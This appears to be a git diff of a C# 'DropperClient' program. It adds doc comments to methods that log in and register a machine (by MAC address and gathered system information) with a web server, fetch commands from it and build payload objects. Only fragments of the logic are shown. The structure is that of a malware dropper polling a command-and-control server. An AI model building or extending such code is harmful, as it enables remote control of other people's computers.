@@ -16,7 +16,7 @@ namespace DropperClient
     {
         private static readonly ILogger logger = new ConsoleLogger();
 
-        private static void Main(string[] args)
+        private static void Main()
         {
             var httpConnection = new ServerConnection(Settings.hostname);
             var requestSender = new RequestSender(httpConnection);
@@ -57,6 +57,12 @@ namespace DropperClient
             }
         }
 
+        /// <summary>
+        /// Attempts to login the user to the webserver
+        /// </summary>
+        /// <param name="requestSender">Instance of requestSender class</param>
+        /// <param name="macAddress">Computer's macaddress</param>
+        /// <returns></returns>
         private static bool Login(RequestSender requestSender, string macAddress)
         {
             var formEncoder = new FormEncoder();
@@ -68,6 +74,13 @@ namespace DropperClient
             return jsonResponseData["message"].ToString().ToLower() == "succes";
         }
 
+        /// <summary>
+        /// Attempts to register the client to the webserver
+        /// Use of Login returns false
+        /// </summary>
+        /// <param name="requestSender">RequestSender instance</param>
+        /// <param name="systemInfo">InfoGatherer instance, contains system information</param>
+        /// <returns></returns>
         private static bool Register(RequestSender requestSender, InfoGatherer systemInfo)
         {
             var formEncoder = new FormEncoder();
@@ -80,6 +93,12 @@ namespace DropperClient
             return jsonResponseData["message"].ToString().ToLower() == "succes";
         }
 
+        /// <summary>
+        /// Attempts to get a new command from the server
+        /// </summary>
+        /// <param name="requestSender">RequestSender class instance</param>
+        /// <param name="macAddress">MacAddress to get the command for</param>
+        /// <returns></returns>
         private static ICommand GetCommand(RequestSender requestSender, string macAddress)
         {
             var formEncoder = new FormEncoder();
@@ -109,6 +128,11 @@ namespace DropperClient
             return null;
         }
 
+        /// <summary>
+        /// Returns a payload instance based on the payloadData Dictionary
+        /// </summary>
+        /// <param name="payloadData">Dictionary containing the payload data</param>
+        /// <returns></returns>
         private static Payload CreatePayload(Dictionary<string, object> payloadData)
         {
             var newPayload = new Payload();
